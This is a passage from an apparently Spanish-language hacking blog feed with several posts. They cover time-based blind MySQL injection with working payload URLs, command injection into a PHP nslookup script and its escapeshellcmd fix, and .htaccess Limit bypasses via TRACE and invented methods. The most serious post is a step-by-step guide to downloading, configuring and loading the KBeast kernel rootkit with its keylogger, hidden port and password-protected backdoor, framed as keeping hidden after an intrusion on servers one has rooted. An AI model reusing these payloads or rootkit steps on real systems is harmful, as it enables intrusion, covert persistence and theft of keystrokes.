</span><span class='line'><span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span><span class="p">,</span> <span class="mi">1</span> <span class="nf">warning</span> <span class="p">(</span><span class="mi">3</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Como vemos la condicion dio como resultado falsa y se le introdujo un retardo de 3 seg ante dicha respuesta.</p>

<p>ahora se pueden imaginar el resultado del vector al combinar ambas funciones con una blind sqli??</p>

<p>No se trata de nada rebuscado, solo hay que utilizar como condicion el vector sqli para dicha inyeccion por ejemplo:</p>

<p>Empezemos desde cero, supongamos que encontraron una web vulnerable que da con el perfil de este tipo de inyeccion y queremos verificar que en realidad se trata de esta, comenzariamos por introcir el siguiente vector en el parametro devil.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if(1=1,sleep(5),0)--   > 5 segundos(TRUE)
</span><span class='line'> 
</span><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if(1=9999,sleep(5),0)--  > FALSE</span></code></pre></td></tr></table></div></figure>


<p>Ahora ya nos damos una idea de como inyectar en la aplicacion comenzando por obtener el listado de las tablas en la base de datos, normalmente en una blind sqli seria de la siguiente manera:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>15-- TRUE
</span><span class='line'> 
</span><span class='line'>http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>50-- TRUE
</span><span class='line'> 
</span><span class='line'>http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>100-- FALSE
</span><span class='line'> 
</span><span class='line'>http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>68-- FALSE
</span><span class='line'> 
</span><span class='line'>http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))=67-- TRUE</span></code></pre></td></tr></table></div></figure>


<p>Veamos como queda armado el vector haciendo uso de nuestro amigo “el tiempo”:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>15,sleep(5),0)-- TRUE 5 segundos
</span><span class='line'> 
</span><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>50,sleep(5),0)-- TRUE 5 segundos
</span><span class='line'> 
</span><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>100,sleep(5),0)-- FALSE
</span><span class='line'> 
</span><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>68,sleep(5),0)-- FALSE
</span><span class='line'> 
</span><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))=67,sleep(5),0)-- TRUE 5 segundos</span></code></pre></td></tr></table></div></figure>


<p>Sencillo, lo unico que tiene de rebuscado esta tecnica es mantener la paciencia mienstras se lleva a cabo la inyeccion manualmente.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SQLI+Mod_Security Bypass]]></title>
    <link href="http://q3rv0.github.io/blog/2014/11/17/sqli-plus-mod-security-bypass/"/>
    <updated>2014-11-17T10:37:16+06:30</updated>
    <id>http://q3rv0.github.io/blog/2014/11/17/sqli-plus-mod-security-bypass</id>
    <content type="html"><![CDATA[<p>Indagando en busca de vulnerabilidades, me cruzo con un input mal validado el cual esta siendo filtrado por un WAF, posiblemente Mod_security, bastante mal configurado, en el video se puede ver como realize una simple evacion de este a <!--more-->travez de /<em>!</em>/ y funciones como unhex(), hex() espero que lo disfruten!</p>

<div class="embed-video-container"><iframe src="//player.vimeo.com/video/55140992"></iframe></div>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[KBEAST] Plantando un Rootkit]]></title>
    <link href="http://q3rv0.github.io/blog/2014/11/17/kbeast-plantando-un-rootkit/"/>
    <updated>2014-11-17T10:19:05+06:30</updated>
    <id>http://q3rv0.github.io/blog/2014/11/17/kbeast-plantando-un-rootkit</id>
    <content type="html"><![CDATA[<p>Siempre es conveniente asegurarse el silencio luego de una intrusion, y con que me refiero al silencio? Ademas de entrar en el tema de borrado de huellas, me refiero a la accion de dejar un secuas en el servidor que se encargue de ocultar ciertos procesos, archivos, etc que dejemos en el target para esto voy a utilizar a KBeast que es un rootkit 2011, ademas de uno de mis preferidos, tiene soporte para los kernel 2.6.18 y 2.6.32,y presenta varias funcionalidades interesantes como:</p>

<p>-Ocultar archivos y directorios</p>

<p>-Ocultar procesos de (ps, pstree, top, lsof)</p>

<p>– Ocultar puertos locales abiertos (backdoors)</p>

<p>-Viene con un modulo keylogger incorporado para capturar las pulsaciones.</p>

<p>-Anti-kill para procesos</p>

<!--more-->


<p>-Anti-remove para archivos</p>

<p>-Trae un backdoor bind incorporado</p>

<p>– Tambien se encarga de esconder ciertos modulos cargando en el kernel ademas de un anti-remove para estos.</p>

<p>Bastante completita la basura!, demas esta decir que requerimos de privilegios de usuario root, en este caso lo voy a realizar en un debian con un kernel 2.6.32 (entorno controlado)</p>

<p>Descargamos el rootkit.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>wget http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/GZ4hh.png"></p>

<p>Una vez extraido nos encontramos con varios files, tendremos que editar a nuestro antojo el archivo de configuracion config.h</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/*
</span><span class='line'>Kernel Beast Ver #1.0 - Configuration File
</span><span class='line'>Copyright Ph03n1X of IPSECS (c) 2011
</span><span class='line'>Get more research of ours http://ipsecs.com
</span><span class='line'>*/
</span><span class='line'> 
</span><span class='line'>/*Don't change this line*/
</span><span class='line'>#define TRUE 1
</span><span class='line'>#define FALSE 0
</span><span class='line'> 
</span><span class='line'>/*
</span><span class='line'>Enable keylog probably makes the system unstable
</span><span class='line'>But worth to be tried
</span><span class='line'>*/
</span><span class='line'>#define _KEYLOG_ TRUE
</span><span class='line'> 
</span><span class='line'>/*Define your module &amp; network daemon name*/
</span><span class='line'>#define KBEAST "kbeast"
</span><span class='line'> 
</span><span class='line'>/*
</span><span class='line'>All files, dirs, process will be hidden
</span><span class='line'>Protected from deletion &amp; being killed
</span><span class='line'>*/
</span><span class='line'>#define _H4X0R_ "_h4x_"
</span><span class='line'> 
</span><span class='line'>/*
</span><span class='line'>Directory where your rootkit will be saved
</span><span class='line'>You have to use _H4X0R_ in your directory name
</span><span class='line'>No slash (/) at the end
</span><span class='line'>*/
</span><span class='line'>#define _H4X_PATH_ "/usr/_h4x_"
</span><span class='line'> 
</span><span class='line'>/*
</span><span class='line'>File to save key logged data
</span><span class='line'>*/
</span><span class='line'>#define _LOGFILE_ "acctlog"
</span><span class='line'> 
</span><span class='line'>/*
</span><span class='line'>This port will be hidded from netstat
</span><span class='line'>*/
</span><span class='line'>#define _HIDE_PORT_ 13377
</span><span class='line'> 
</span><span class='line'>/*
</span><span class='line'>Password for remote access
</span><span class='line'>*/
</span><span class='line'>#define _RPASSWORD_ "h4x3d"
</span><span class='line'>#define _MAGIC_NAME_ "bin"
</span><span class='line'>/*
</span><span class='line'>Magic signal &amp; pid for local escalation
</span><span class='line'>*/
</span><span class='line'>#define _MAGIC_SIG_ 37 //kill signal
</span><span class='line'>#define _MAGIC_PID_ 31337 //kill this pid</span></code></pre></td></tr></table></div></figure>


<p>prosigo a explicar la funcion de cada linea en el fichero de configuracion.</p>

<p>1- La primera linea la dejamos tal cual esta</p>

<p>2- la segunda se encarga de activar el modulo keylogger del rootkit en caso contrario escribimos</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#define _KEYLOG_ FALSE</span></code></pre></td></tr></table></div></figure>


<p>3- se encarga de darle el nombre al daemon rootkit</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#define KBEAST "q3rv0"</span></code></pre></td></tr></table></div></figure>


<p>4 – En esta linea vamos a incluir los ficheros y directorios que queremos que sean protegidos por el anti-remove.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#define _H4X0R_ "/home/q3rv0/protect/q3rv0.txt"</span></code></pre></td></tr></table></div></figure>


<p>5- Define el directorio donde se guardara KBeast</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#define _H4X_PATH_ "/usr/share/kbeast"</span></code></pre></td></tr></table></div></figure>


<p>6 – Aca especificamos el nombre del fichero de log donde van a ir a parar las pulsasiones capturadas por el keylogger</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#define _LOGFILE_ "acctlog"</span></code></pre></td></tr></table></div></figure>


<p>7- El puerto que estara hide a la vista de los comandos anteriormente mencionados.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#define _HIDE_PORT_ 6666</span></code></pre></td></tr></table></div></figure>


<p>8- Incluimos el password para el acceso con el backdoor.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#define _RPASSWORD_ "q3rv0"
</span><span class='line'>#define _MAGIC_NAME_ "bin"</span></code></pre></td></tr></table></div></figure>


<p>Habiendo terminado de configurar el ficherito, que bastante intuitivo es, si me saltee la 9, pero esa la dejo tal cual esta.</p>

<p>Procedemos a lanzar el rootkit de la siguiente manera.</p>

<p>En los kernel 2.6.18</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>./setup buil 0
</span></code></pre></td></tr></table></div></figure>


<p>En los 2.6.32 como es mi caso</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>./setup build
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/hw6x4.png"></p>

<p>Vemos que se compilo exitosamente en el nucleo sin ningun error, ahora vamos a comprobar si cumple con nuestras espectativas.</p>

<p>-Verificando la proteccion anti-remove de ficheros</p>

<p><img src="http://i.imgur.com/500HR.png"></p>

<p>– Directorio donde se guarda el rootkit en el systema</p>

<p><img src="http://i.imgur.com/VSJz7.png"></p>

<p>– Pulsaciones capturadas por el modulo keylogger…
El fichero de log se guarda en el directorio donde le indicamos que se guarde el rootkit.</p>

<p><img src="http://i.imgur.com/GPSES.png"></p>

<p>– Port 6666 Hide</p>

<p><img src="http://i.imgur.com/xjczD.png"></p>

<p>– Accediendo al sistema a travez del backdoor en el puerto 6666</p>

<p><img src="http://i.imgur.com/ygqhy.png"></p>

<p>– oka, para remover el rootkit del kernel solo basta realizar un:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>./setup clean
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/FwpY9.png"></p>

<p>Espero que lo hayan disfrutado y cada vez que rooteen un server acuerdense de kbeast :)</p>

<p>Saludos!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[remote code execution]]></title>
    <link href="http://q3rv0.github.io/blog/2014/11/17/remote-code-execution/"/>
    <updated>2014-11-17T10:04:38+06:30</updated>
    <id>http://q3rv0.github.io/blog/2014/11/17/remote-code-execution</id>
    <content type="html"><![CDATA[<p>La ejecucion remota de comandos, como su nombre lo dice, es una vulnerabilidad
que nos permite inyectar ordenes remotamente en el sistema, basicamente se
debe a un mal filtrado de variables que utilizan funciones como:<!--more--></p>

<p>system()</p>

<p>passthru()</p>

<p>shell_exec()</p>

<p>exec()</p>

<p>ssh2_exec()</p>

<p>Y demas funciones php que permiten la ejecucion de comandos en el OS.</p>

<p>Hay ciertas webs, que utilizan scripts que se encargan de interactuar
con los datos que el usuario provee en la aplicacion, muchos de ustedes
seguramente habran echo uso de servicios de fingerprinting online, los cuales
nos permiten utilizar comandos como whois, ping, dig, nslookup, etc</p>

<p><img src="http://i.imgur.com/BFcGN.png"></p>

<p>justamente de este tipo de webs hablo, si no se aplica una correcta seguridad en la aplicacion podria ser brutal para la misma, ya que cualquier usuario con conocimientos se podria aprovechar del mal filtro y lanzar comandos arbitrariamente en el sistema oporativo.</p>

<p>En si la explotacion de este tipo de vulnerabilidad no conlleva una complicaion
en cuanto al uso de vectores largos, salvo que en el servidor victima este
corriendo mod_security o algun otro tipo de waf con sus respectivos filtros. La
idea no es explicar a evadir los mismos, si no mostrar que tan sencillo es explotar esta tecnica.</p>

<p>Vamos a ver un posible codigo vulnerable.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;boton-ping&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$objetivo</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;target&#39;</span><span class="p">];</span>
</span><span class='line'>    <span class="k">echo</span> <span class="s2">&quot;&lt;pre class=”report-header”&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">&quot; nslookup &quot;</span> <span class="o">.</span><span class="nv">$objetivo</span><span class="p">);</span>
</span><span class='line'>    <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Vemos como toma los valores del usuario a travez de POST, y luego ejecuta
la entrada con nslookup, a todo esto, no hay una sola verificacion de variables, desp voy a explicar como se puede corregir el script.</p>

<p>Como se puede aprovechar de la ineficiencia de un programador?</p>

<p>Sencillamente, usando una | (tuberia pipe) o ; (actua como separador de comandos)</p>

<p>Supongamos que quisieramos averiguar la version del kernel.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'> 
</span><span class='line'>10.x.x.x<span class="p">|</span>uname -a
</span></code></pre></td></tr></table></div></figure>


<p>o</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>10.x.x.x <span class="p">;</span> uname -a
</span></code></pre></td></tr></table></div></figure>


<p>De esta manera el script quedaria sano y salvo a la entrada de comandos por parte de un atacante.
El codigo se ejecutaria de la siguiente manera en el script.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>nslookup 10.x.x.x<span class="p">|</span>uname -a
</span></code></pre></td></tr></table></div></figure>


<p>Lo cual terminaria imprimiendo la version del kernel.</p>

<p>Sencillo no??.</p>

<p>Como se puede corregir esta vulnerabilidad?</p>

<p>– Validando la entrada de datos con funciones como escapeshellarg(), escapeshellcmd()</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;boton-ping&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$objetivo</span><span class="o">=</span><span class="nb">escapeshellcmd</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;target&#39;</span><span class="p">]);</span>
</span><span class='line'>    <span class="k">echo</span> <span class="s2">&quot;&lt;pre class=”report-header”&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">&quot; nslookup &quot;</span> <span class="o">.</span><span class="nv">$objetivo</span><span class="p">);</span>
</span><span class='line'>    <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>De esta manera el script quedaria sano y salvo a la entrada de comandos por parte de un atacante.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[jugando con .htaccess]]></title>
    <link href="http://q3rv0.github.io/blog/2014/11/17/jugando-con-htaccess/"/>
    <updated>2014-11-17T09:27:30+06:30</updated>
    <id>http://q3rv0.github.io/blog/2014/11/17/jugando-con-htaccess</id>
    <content type="html"><![CDATA[<p>La mayoria ya conoce cual es la funcion de este archivo en el servidor encargandose de actuar sobre el fichero de configuracion de apache “httpd.conf”</p>

<p>Permite:</p>

<p>Redireccion de url’s</p>

<p>Respuestas de error personalizadas.</p>

<p>Proteccion de directorios, subdirectorios y ficheros en el servidor.</p>

<p>Certificados de autentificacion http.</p>

<p>etc…</p>

<!--more-->


<p>No vengo a escribrir de como implementar cada una de sus funciones.</p>

<p>En la Black-Hat pasada se hablo de una supuesta vulnerabilidad en .htaccess, yo creo que mas que una vulnerabilidad es solo una mala implementacion del metodo &ldquo;Limit&rdquo; cuando se desea restringir el acceso a cierto directorio/fichero presentando un certificado de autentificacion http.</p>

<p>En cuanto a estos tipos de certificados tenemos los:</p>

<p>Basicos: La contraseña viaja en texto plano</p>

<p>Resumen: El servidor le aplica un hash al password antes de ser enviado.</p>

<p>En la siguiente imagen podemos encontrar un servidor que implementa un certificado de tipo basico.</p>

<p><img src="http://i.imgur.com/jJOj8.png"></p>

<p>Conociendo la cantidad de admins que andan sueltos, Podriamos deducir para suerte nuestra que nos estariamos encontrando con un .htaccess configurado de la siguiente manera (supongamos).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>AuthUserFile .htpasswd
</span><span class='line'>AuthName "Area Radioactiva"
</span><span class='line'>AuthType Basic
</span><span class='line'> 
</span><span class='line'>&lt;Limit GET>
</span><span class='line'>require valid-user
</span><span class='line'>&lt;/Limit></span></code></pre></td></tr></table></div></figure>


<p>Donde esta la mala implementacion?</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;Limit GET></span></code></pre></td></tr></table></div></figure>


<p>Vemos que solo se limita a peticiones GET, dejando de lado TRACE, OPTIONS, POST, PUT, COPY, MOVE, DELETE, TRACK, etc, entre otras.</p>

<p>Podriamos obtener el contenido de algun fichero detras de la proteccion utilizando el metodo POST.</p>

<p><img src="http://i.imgur.com/Yy4KK.png"></p>

<p>Otras configuraciones mas restringidas incluyen el metodo POST como limite.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>AuthUserFile .htpasswd
</span><span class='line'>AuthName "Area Radioactiva"
</span><span class='line'>AuthType Basic
</span><span class='line'> 
</span><span class='line'>&lt;Limit GET POST>
</span><span class='line'>require valid-user
</span><span class='line'>&lt;/Limit></span></code></pre></td></tr></table></div></figure>


<p>Pero eso no nos niega la posibilidad de enumerar los ficheros y directorios protegidos por .htaccess utilizando los demas metodos que se hayen habilitados en el servidor.</p>

<p>Si analizamos, ahun existiendo o no el path /files/pass.txt, el servidor nos responderia con el mismo error 401 (no autorizado)</p>

<p><img src="http://i.imgur.com/NG8WN.png"></p>

<p>Lo mismo pasara al realizar una peticion POST, pero que hay de los demas metodos, como responderia ante una peticion http que no este dentro de los <Limit> ? por ejemplo TRACE.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>TRACE /files/pass.txt HTTP/1.0
</span><span class='line'> 
</span><span class='line'>HTTP/1.0 200 ok
</span><span class='line'>Date: Thu, 05 Jul 2012 10:53:32 GTM
</span><span class='line'>Server: Apache /2.2.3 (centOS)
</span><span class='line'>Connection: close
</span><span class='line'>Content-type: message/http
</span><span class='line'>TRACE /files/pass.txt HTTP/1.0</span></code></pre></td></tr></table></div></figure>


<p>Evidentemente nos responde con 200 ok, hemos logrado evadir la restriccion del .htaccess para deducir la existencia del fichero en el servidor, en caso de no existir el servidor nos responderia con un error 404.</p>

<p>Otro manera seria realizar peticiones con metodos no implementados e inexistentes como GETS, el servidor lo tomaria como si se tratara de un metodo GET.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GETS /files/pass.txt HTTP/1.1
</span><span class='line'> 
</span><span class='line'>HTTP/1.0 200 ok
</span><span class='line'>Date: Thu, 05 Jul 2012 10:53:32 GTM
</span><span class='line'>Server: Apache /2.2.3 (centOS)
</span><span class='line'>Connection: close
</span><span class='line'>Content-type: message/http</span></code></pre></td></tr></table></div></figure>


<p>Este tipo de evaciones lo implementa la herramientas HTexploit.</p>

<p><img src="http://i.imgur.com/qsBVV.png"></p>

<p>Saludos!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Tecnicas de Blind Mysql Injection]]></title>
    <link href="http://q3rv0.github.io/blog/2014/11/17/tecnicas-de-blind-mysql-injection/"/>
    <updated>2014-11-17T08:41:03+06:30</updated>
    <id>http://q3rv0.github.io/blog/2014/11/17/tecnicas-de-blind-mysql-injection</id>
    <content type="html"><![CDATA[<p>Hola como estan todos!? este es un nuevo pdf en el que pretendo desarrollar de manera sencilla y entendible dos tecnicas de inyeccion a ciegas en base de datos Mysql, por un lado me gustaria comenzar a hacer un corto repaso de la tecnica “binary search” que es comunmente las mas usada y conocida para realizar este tipo de ataques<!--more-->, despues pasar a lo que es el metodo “Bit Shifting” y por ultimo culminar con otro metodo que hace uso de la funcion FIND_IN_SET().</p>

<p>Disfruten el documento :)</p>

<iframe src="http://www.slideshare.net/slideshow/embed_code/13796822" width="595" height="446" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC;border-width:1px 1px 0;margin-bottom:5px" allowfullscreen></iframe>


<p></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Resultado del LAMPSecurity:CTF 6 Challenge]]></title>
    <link href="http://q3rv0.github.io/blog/2014/11/17/resultado-del-lampsecurity-ctf-6-challenge/"/>
    <updated>2014-11-17T08:30:28+06:30</updated>
    <id>http://q3rv0.github.io/blog/2014/11/17/resultado-del-lampsecurity-ctf-6-challenge</id>
    <content type="html"><![CDATA[<p>Hace aproximadamente una semana, la comunidad sec-track en asociacion con hacklabs, lanzo un reto, medio viejito ya, que consistia en encontrar una nueva manera de penetrar en el entorno virtual LAMPSecurity CTF 6, el ganadaor del laboratorio resulto ser killr00t con una intrucion que no me convencio mucho ya que buscando encontre algo parecido ¬¬<!--more-->.</p>

<p>Pero lo felicito de igual manera…y les dejo el solucionario que realize y envie, salvo que no logre conseguir acceso como usuario root en el sistema :(</p>

<p>Me pregunto que hubiera pasado con el resultado si hubiera rooteado?…</p>

<p>opinen…</p>

<iframe src="http://www.slideshare.net/slideshow/embed_code/13458882" width="595" height="446" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC;border-width:1px 1px 0;margin-bottom:5px" allowfullscreen></iframe>


<p></p>

<p>Y por aca les dejo el de Killr00t</p>

<p><a href="http://issuu.com/elhacklab/docs/lampsecurity_ctf6_pentest_killr00t_sec-track?e=0">http://issuu.com/elhacklab/docs/lampsecurity_ctf6_pentest_killr00t_sec-track?e=0</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[admins...admins...]]></title>
    <link href="http://q3rv0.github.io/blog/2014/11/17/admins-dot-dot-dot-admins-dot-dot-dot/"/>
    <updated>2014-11-17T08:25:26+06:30</updated>
    <id>http://q3rv0.github.io/blog/2014/11/17/admins-dot-dot-dot-admins-dot-dot-dot</id>
    <content type="html"><![CDATA[<p>Siempre antes de realizar un análisis de puertos y servicios en el servidor, siempre antes que revisar cualquier punto de ataque, estoy acostumbrado a indagar sobre los distintos tipos de archivos que pueda albergar la aplicación en la zona pública: <em>.xls, </em>.sql, <em>docx, </em>.txt, <em>.jsp, </em>.php, etc.<!--more--></p>

<p>Hay ciertas ocaciones en las que uno se encuentra con este tipo de cosas…</p>

<p><img src="http://i.imgur.com/JGX89.png"></p>

